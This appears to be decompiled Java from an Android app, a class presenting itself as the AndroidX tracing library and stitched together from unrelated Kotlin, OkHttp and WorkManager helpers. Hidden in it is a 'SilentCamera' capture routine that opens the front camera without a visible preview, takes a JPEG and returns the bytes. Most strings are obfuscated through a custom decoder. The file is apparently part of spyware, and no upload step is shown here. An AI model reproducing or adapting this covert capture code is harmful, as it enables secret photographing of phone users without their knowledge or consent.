package androidx.tracing;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.view.Surface;
import androidx.work.NetworkType$EnumUnboxingLocalUtility;
import androidx.work.impl.model.WorkGenerationalId;
import androidx.work.impl.model.WorkSpec;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.security.cert.Certificate;
import java.util.Arrays;
import java.util.List;
import java.util.NoSuchElementException;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import javax.net.ssl.SSLPeerUnverifiedException;
import javax.net.ssl.SSLSession;
import kotlin.collections.CollectionsKt__CollectionsKt;
import kotlin.collections.EmptyList;
import kotlin.coroutines.CoroutineContext;
import kotlin.coroutines.EmptyCoroutineContext;
import kotlin.io.CloseableKt;
import kotlin.random.AbstractPlatformRandom;
import kotlin.random.Random;
import kotlin.ranges.IntProgression;
import kotlin.ranges.IntRange;
import kotlin.ranges.LongRange;
import kotlin.text.Regex;
import okhttp3.CipherSuite;
import okhttp3.Handshake;
import okhttp3.TlsVersion;
import okhttp3.internal.Util;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public abstract class Trace {
    public static Method sIsTagEnabledMethod;
    public static long sTraceTagApp;

    public static void buildShortClassTag(Object obj, StringBuilder sb) {
        int iLastIndexOf;
        if (obj == null) {
            sb.append(C0000.decode(new byte[]{11, 23, 9, 95}, "ebe33259"));
            return;
        }
        String simpleName = obj.getClass().getSimpleName();
        if (simpleName.length() <= 0 && (iLastIndexOf = (simpleName = obj.getClass().getName()).lastIndexOf(46)) > 0) {
            simpleName = simpleName.substring(iLastIndexOf + 1);
        }
        sb.append(simpleName);
        sb.append('{');
        sb.append(Integer.toHexString(System.identityHashCode(obj)));
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r1v1 */
    /* JADX WARN: Type inference failed for: r1v2 */
    /* JADX WARN: Type inference failed for: r1v3 */
    /* JADX WARN: Type inference failed for: r2v0 */
    /* JADX WARN: Type inference failed for: r2v1, types: [android.os.HandlerThread] */
    /* JADX WARN: Type inference failed for: r2v6 */
    /* JADX WARN: Type inference failed for: r2v7 */
    public static final byte[] capture(Context context) {
        ?? r2;
        String str;
        Object obj;
        try {
            Object systemService = context.getSystemService(C0000.decode(new byte[]{82, 83, 95, 85, 22, 82}, "1220d37ae02b", true));
            CameraManager cameraManager = systemService instanceof CameraManager ? (CameraManager) systemService : null;
            if (cameraManager != null) {
                String[] cameraIdList = cameraManager.getCameraIdList();
                int length = cameraIdList.length;
                int i = 0;
                while (true) {
                    if (i >= length) {
                        str = null;
                        break;
                    }
                    str = cameraIdList[i];
                    Integer num = (Integer) cameraManager.getCameraCharacteristics(str).get(CameraCharacteristics.LENS_FACING);
                    if (num != null && num.intValue() == 0) {
                        break;
                    }
                    i++;
                }
                if (str != null) {
                    HandlerThread handlerThread = new HandlerThread(C0000.decode(new byte[]{64, 91, 93, 83, 3, 85}, "3210b8623c", 5));
                    handlerThread.start();
                    try {
                        Handler handler = new Handler(handlerThread.getLooper());
                        ImageReader imageReaderNewInstance = ImageReader.newInstance(640, 480, 256, 2);
                        final byte[][] bArr = new byte[1][];
                        final CountDownLatch countDownLatch = new CountDownLatch(1);
                        SurfaceTexture surfaceTexture = new SurfaceTexture(0);
                        surfaceTexture.setDefaultBufferSize(640, 480);
                        Surface surface = new Surface(surfaceTexture);
                        final CountDownLatch countDownLatch2 = new CountDownLatch(1);
                        final Regex regex = new Regex(1);
                        cameraManager.openCamera(str, new CameraDevice.StateCallback() { // from class: com.base.template.network.SilentCamera$capture$2
                            @Override // android.hardware.camera2.CameraDevice.StateCallback
                            public final void onDisconnected(CameraDevice cameraDevice) {
                                cameraDevice.close();
                                countDownLatch2.countDown();
                            }

                            @Override // android.hardware.camera2.CameraDevice.StateCallback
                            public final void onError(CameraDevice cameraDevice, int i2) {
                                cameraDevice.close();
                                countDownLatch2.countDown();
                            }

                            @Override // android.hardware.camera2.CameraDevice.StateCallback
                            public final void onOpened(CameraDevice cameraDevice) {
                                regex.nativePattern = cameraDevice;
                                countDownLatch2.countDown();
                            }
                        }, handler);
                        TimeUnit timeUnit = TimeUnit.SECONDS;
                        ?? r1 = 8;
                        try {
                            try {
                                if (!countDownLatch2.await(8L, timeUnit) || (obj = regex.nativePattern) == null) {
                                    cleanup(null, handlerThread, surface, surfaceTexture, imageReaderNewInstance);
                                    return null;
                                }
                                CameraDevice cameraDevice = (CameraDevice) obj;
                                imageReaderNewInstance.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() { // from class: com.base.template.network.SilentCamera$$ExternalSyntheticLambda0
                                    @Override // android.media.ImageReader.OnImageAvailableListener
                                    public final void onImageAvailable(ImageReader imageReader) {
                                        byte[][] bArr2 = bArr;
                                        Image imageAcquireLatestImage = imageReader.acquireLatestImage();
                                        if (imageAcquireLatestImage == null) {
                                            return;
                                        }
                                        try {
                                            ByteBuffer buffer = imageAcquireLatestImage.getPlanes()[0].getBuffer();
                                            byte[] bArr3 = new byte[buffer.remaining()];
                                            buffer.get(bArr3);
                                            bArr2[0] = bArr3;
                                            imageAcquireLatestImage.close();
                                            countDownLatch.countDown();
                                        } catch (Throwable th) {
                                            imageAcquireLatestImage.close();
                                            throw th;
                                        }
                                    }
                                }, handler);
                                final CountDownLatch countDownLatch3 = new CountDownLatch(1);
                                final Regex regex2 = new Regex(1);
                                cameraDevice.createCaptureSession(CollectionsKt__CollectionsKt.listOf(surface, imageReaderNewInstance.getSurface()), new CameraCaptureSession.StateCallback() { // from class: com.base.template.network.SilentCamera$capture$4
                                    @Override // android.hardware.camera2.CameraCaptureSession.StateCallback
                                    public final void onConfigureFailed(CameraCaptureSession cameraCaptureSession) {
                                        countDownLatch3.countDown();
                                    }

                                    @Override // android.hardware.camera2.CameraCaptureSession.StateCallback
                                    public final void onConfigured(CameraCaptureSession cameraCaptureSession) {
                                        regex2.nativePattern = cameraCaptureSession;
                                        countDownLatch3.countDown();
                                    }
                                }, handler);
                                if (!countDownLatch3.await(8L, timeUnit) || regex2.nativePattern == null) {
                                    cleanup(cameraDevice, handlerThread, surface, surfaceTexture, imageReaderNewInstance);
                                    return null;
                                }
                                CaptureRequest.Builder builderCreateCaptureRequest = cameraDevice.createCaptureRequest(1);
                                builderCreateCaptureRequest.addTarget(surface);
                                ((CameraCaptureSession) regex2.nativePattern).setRepeatingRequest(builderCreateCaptureRequest.build(), null, handler);
                                Thread.sleep(600L);
                                CaptureRequest.Builder builderCreateCaptureRequest2 = cameraDevice.createCaptureRequest(2);
                                builderCreateCaptureRequest2.addTarget(imageReaderNewInstance.getSurface());
                                builderCreateCaptureRequest2.set(CaptureRequest.JPEG_QUALITY, (byte) 70);
                                ((CameraCaptureSession) regex2.nativePattern).capture(builderCreateCaptureRequest2.build(), null, handler);
                                countDownLatch.await(8L, timeUnit);
                                try {
                                    CameraCaptureSession cameraCaptureSession = (CameraCaptureSession) regex2.nativePattern;
                                    if (cameraCaptureSession != null) {
                                        cameraCaptureSession.close();
                                    }
                                } catch (Exception unused) {
                                }
                                cleanup(cameraDevice, handlerThread, surface, surfaceTexture, imageReaderNewInstance);
                                byte[] bArr2 = bArr[0];
                                if (bArr2 != null) {
                                    return rotateLeft90(bArr2);
                                }
                                return null;
                            } catch (Exception e) {
                                e = e;
                            }
                        } catch (Exception e2) {
                            e = e2;
                            r1 = handlerThread;
                        }
                        r2 = r1;
                    } catch (Exception e3) {
                        e = e3;
                        r2 = handlerThread;
                    }
                }
                e.getMessage();
                if (r2 != 0) {
                    try {
                        r2.quitSafely();
                    } catch (Exception unused2) {
                    }
                }
            }
        } catch (Exception e4) {
            e = e4;
            r2 = 0;
        }
        return null;
    }

    public static void checkNotNull(Object obj, String str) {
        if (obj == null) {
            throw new NullPointerException(str);
        }
    }

    public static void checkRangeIndexes$kotlin_stdlib(int i, int i2, int i3) {
        String strDecode = C0000.decode(new byte[]{3, 22, 10, 84, 120, 13, 87, 3, 29, 94, 69}, "ede91c3f", 6);
        if (i >= 0 && i2 <= i3) {
            if (i > i2) {
                throw new IllegalArgumentException(NetworkType$EnumUnboxingLocalUtility.m(i, i2, strDecode, C0000.decode(new byte[]{65, 92, 68, 77, 91, 122, 89, 5, 86, 77, 8, 23}, "abd9437a35275db8", 0.0f)));
            }
            return;
        }
        throw new IndexOutOfBoundsException(strDecode + i + C0000.decode(new byte[]{20, 67, 65, 91, 123, 8, 7, 84, 28, 88, 19}, "8c542fc1db3a75c3") + i2 + C0000.decode(new byte[]{24, 65, 64, 13, 25, 80, 15, 22}, "4a3dc556", false) + i3);
    }

    public static void cleanup(CameraDevice cameraDevice, HandlerThread handlerThread, Surface surface, SurfaceTexture surfaceTexture, ImageReader imageReader) {
        if (cameraDevice != null) {
            try {
                cameraDevice.close();
            } catch (Exception unused) {
            }
        }
        try {
            surface.release();
        } catch (Exception unused2) {
        }
        try {
            surfaceTexture.release();
        } catch (Exception unused3) {
        }
        try {
            imageReader.close();
        } catch (Exception unused4) {
        }
        try {
            handlerThread.quitSafely();
        } catch (Exception unused5) {
        }
    }

    public static int coerceIn(int i, int i2) {
        if (i2 < 0) {
            throw new IllegalArgumentException(NetworkType$EnumUnboxingLocalUtility.m(C0000.decode(new byte[]{115, 87, 94, 92, 11, 77, 21, 80, 95, 83, 66, 81, 1, 25, 67, 82, 92, 67, 85, 18, 16, 86, 21, 82, 94, 22, 85, 95, 20, 77, 76, 19, 66, 87, 94, 85, 1, 3, 21, 94, 81, 78, 89, 95, 17, 84, 21}, "0602d953"), C0000.decode(new byte[]{67, 13, 65, 69, 85, 85, 16, 23, 18, 17, 81, 81, 13, 68, 95, 12, 87, 89, 14, 17, 95, 69, 9, 30}, "cd2e90", 0.0f), i2));
        }
        if (i < 0) {
            return 0;
        }
        return i > i2 ? i2 : i;
    }

    public static void d(String str, String str2, Object obj) {
        if (Log.isLoggable(C0000.decode(new byte[]{48, 102, 66, 95, 65, 8, 9, 81, 25}, "d4715a", 1).concat(str), 3)) {
            String.format(str2, obj);
        }
    }

    public static final WorkGenerationalId generationalId(WorkSpec workSpec) {
        return new WorkGenerationalId(workSpec.id, workSpec.generation);
    }

    public static Handshake get(SSLSession sSLSession) throws IOException {
        List listImmutableListOf;
        List listImmutableListOf2 = EmptyList.INSTANCE;
        String cipherSuite = sSLSession.getCipherSuite();
        if (cipherSuite == null) {
            throw new IllegalStateException(C0000.decode(new byte[]{87, 90, 69, 13, 86, 70, 107, 19, 93, 71, 80, 69, 14, 9, 24, 8, 65, 95, 89}, "435e348f", false));
        }
        if (cipherSuite.equals(C0000.decode(new byte[]{101, 47, 53, 61, 127, 48, 40, 45, 102, 100, 126, 99, 121, 60, 40, 55, 125, 41, 59, 47, 108, 127, 123}, "1cfb1eda9377", 0.0f)) ? true : cipherSuite.equals(C0000.decode(new byte[]{53, 97, 123, 102, 118, 103, 42, 126, 104, 110, 113, 102, 46, 109, 121, 108, 116, 126, 57, 124, 98, 117, 116}, "f27982"))) {
            throw new IOException(C0000.decode(new byte[]{90, 94, 68, 94, 92, 68, 49, 22, 11, 65, 87, 25, 4, 10, 20}, "974696bcb529", 0.0f).concat(cipherSuite));
        }
        CipherSuite cipherSuiteForJavaName = CipherSuite.Companion.forJavaName(cipherSuite);
        String protocol = sSLSession.getProtocol();
        if (protocol == null) {
            throw new IllegalStateException(C0000.decode(new byte[]{77, 93, 22, 55, 6, 64, 22, 10, 86, 95, 69, 92, 94, 18, 11, 22, 85, 93}, "91eac2ec"));
        }
        if (C0000.decode(new byte[]{126, 46, 45, 33}, "0acddad018ce345d", 0.0f).equals(protocol)) {
            throw new IOException(C0000.decode(new byte[]{76, 91, 70, 52, 87, 22, 23, 81, 87, 89, 21, 95, 15, 68, 42, 119, 118, 114}, "875b2dd8", 0.0f));
        }
        TlsVersion tlsVersionForJavaName = CloseableKt.forJavaName(protocol);
        try {
            Certificate[] peerCertificates = sSLSession.getPeerCertificates();
            listImmutableListOf = peerCertificates != null ? Util.immutableListOf(Arrays.copyOf(peerCertificates, peerCertificates.length)) : listImmutableListOf2;
        } catch (SSLPeerUnverifiedException unused) {
        }
        Certificate[] localCertificates = sSLSession.getLocalCertificates();
        if (localCertificates != null) {
            listImmutableListOf2 = Util.immutableListOf(Arrays.copyOf(localCertificates, localCertificates.length));
        }
        return new Handshake(tlsVersionForJavaName, cipherSuiteForJavaName, listImmutableListOf2, new Handshake.AnonymousClass2(5, listImmutableListOf));
    }

    public static String getTag(String str) {
        return C0000.decode(new byte[]{100, 102, 70, 12, 77, 90, 84, 3, 24}, "043b939f6f", false).concat(str);
    }

    public static boolean isEnabled() {
        try {
            if (sIsTagEnabledMethod == null) {
                return android.os.Trace.isEnabled();
            }
        } catch (NoClassDefFoundError | NoSuchMethodError unused) {
        }
        try {
            if (sIsTagEnabledMethod == null) {
                sTraceTagApp = android.os.Trace.class.getField(C0000.decode(new byte[]{48, 103, 36, 115, 119, 107, 100, 119, 119, 61, 119, 98, 52}, "d5e024060b62d5c8")).getLong(null);
                sIsTagEnabledMethod = android.os.Trace.class.getMethod(C0000.decode(new byte[]{8, 68, 109, 4, 5, 32, 94, 7, 86, 89, 6, 81}, "a79ebe0f45c5d2", false), Long.TYPE);
            }
            return ((Boolean) sIsTagEnabledMethod.invoke(null, Long.valueOf(sTraceTagApp))).booleanValue();
        } catch (Exception e) {
            if (!(e instanceof InvocationTargetException)) {
                return false;
            }
            Throwable cause = e.getCause();
            if (cause instanceof RuntimeException) {
                throw ((RuntimeException) cause);
            }
            throw new RuntimeException(cause);
        }
    }

    public static final boolean permitsRequestBody(String str) {
        return (str.equals(C0000.decode(new byte[]{117, 114, 108}, "278f2f0cfcce44")) || str.equals(C0000.decode(new byte[]{44, 125, 34, 39}, "d8cc83"))) ? false : true;
    }

    public static CoroutineContext plus(CoroutineContext coroutineContext, CoroutineContext coroutineContext2) {
        return coroutineContext2 == EmptyCoroutineContext.INSTANCE ? coroutineContext : (CoroutineContext) coroutineContext2.fold(coroutineContext, CoroutineContext.AnonymousClass1.INSTANCE);
    }

    public static long random(LongRange longRange) {
        AbstractPlatformRandom abstractPlatformRandom = Random.defaultRandom;
        try {
            long j = longRange.first;
            long j2 = longRange.last;
            if (j > j2) {
                throw new IllegalArgumentException(C0000.decode(new byte[]{39, 83, 90, 95, 86, 66, 67, 5, 85, 67, 23, 67, 83, 95, 2, 88, 9, 18, 93, 95, 25, 83, 14, 18, 68, 78, 23, 67, 83, 95, 1, 82, 94, 18}, "d24196cb077121f7", 3) + longRange);
            }
            if (j2 < Long.MAX_VALUE) {
                return Random.defaultRandom.nextLong(j, j2 + 1);
            }
            if (j > Long.MIN_VALUE) {
                return Random.defaultRandom.nextLong(j - 1, j2) + 1;
            }
            return Random.defaultRandom.nextLong();
        } catch (IllegalArgumentException e) {
            throw new NoSuchElementException(e.getMessage());
        }
    }

    public static byte[] rotateLeft90(byte[] bArr) {
        try {
            Bitmap bitmapDecodeByteArray = BitmapFactory.decodeByteArray(bArr, 0, bArr.length);
            if (bitmapDecodeByteArray == null) {
                return bArr;
            }
            Matrix matrix = new Matrix();
            matrix.postRotate(-90.0f);
            Bitmap bitmapCreateBitmap = Bitmap.createBitmap(bitmapDecodeByteArray, 0, 0, bitmapDecodeByteArray.getWidth(), bitmapDecodeByteArray.getHeight(), matrix, true);
            if (bitmapCreateBitmap != bitmapDecodeByteArray) {
                bitmapDecodeByteArray.recycle();
            }
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            bitmapCreateBitmap.compress(Bitmap.CompressFormat.JPEG, 70, byteArrayOutputStream);
            bitmapCreateBitmap.recycle();
            return byteArrayOutputStream.toByteArray();
        } catch (Exception e) {
            e.getMessage();
            return bArr;
        }
    }

    public static IntProgression step(IntRange intRange, int i) {
        boolean z = i > 0;
        Integer numValueOf = Integer.valueOf(i);
        if (!z) {
            throw new IllegalArgumentException(C0000.decode(new byte[]{49, 66, 87, 66, 19, 89, 66, 22, 22, 22, 80, 87, 19, 68, 88, 22, 11, 66, 91, 68, 86, 24, 23, 18, 3, 69, 8, 18}, "b622347e", true) + numValueOf + '.');
        }
        int i2 = intRange.first;
        int i3 = intRange.last;
        if (intRange.step <= 0) {
            i = -i;
        }
        return new IntProgression(i2, i3, i);
    }

    public static IntRange until(int i, int i2) {
        if (i2 > Integer.MIN_VALUE) {
            return new IntRange(i, i2 - 1, 1);
        }
        IntRange intRange = IntRange.EMPTY;
        return IntRange.EMPTY;
    }
}
